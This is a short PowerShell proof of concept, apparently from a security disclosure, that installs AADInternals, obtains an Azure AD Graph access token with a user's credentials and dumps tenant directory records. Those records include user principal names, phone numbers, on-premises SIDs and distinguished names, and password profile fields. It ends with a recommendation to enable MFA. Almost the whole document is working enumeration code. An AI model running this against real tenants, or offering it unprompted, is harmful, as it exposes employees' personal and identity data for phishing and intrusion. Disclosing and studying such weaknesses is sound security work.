### Proof of concept ###
<#External users can request tokens for "graph.windows.net" (AzureAD) then proceed to dump directory data from Azure tenants...

#The proof of concept below simply requests an access_token for AzureAD then performs a query to demonstrate potential impact.  

#Recommendation: Enable MFA for all identities in the Cloud!
#>

#Uncomment the 3 lines below to install AADInternals 
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals 

$creds = Get-Credential firstName.LastName@yourDomain.com 
$token = Get-AADIntAccessTokenForAADGraph -Credentials $creds -Verbose 
$tenant = Get-AADIntTenantDetails -AccessToken $token
$headers = @{
    Authorization="Bearer $token"
}
$uri = 'https://graph.windows.net/<TENANTID>/users?api-version=1.61-internal'

$uri = $uri -replace "<TENANTID>", $tenant.objectID
$results = Invoke-RestMethod -Method Get -Uri $uri -Headers $headers 
$results.value | select userPrincipalName, telephoneNumber, City, usageLocation, companyName, onPremisesDistinguishedName, onPremisesSecurityIdentifier, displayName, passwordProfile | ft

#Inspect access_token by uncommenting the line below 
#Read-AADIntAccesstoken -AccessToken $token
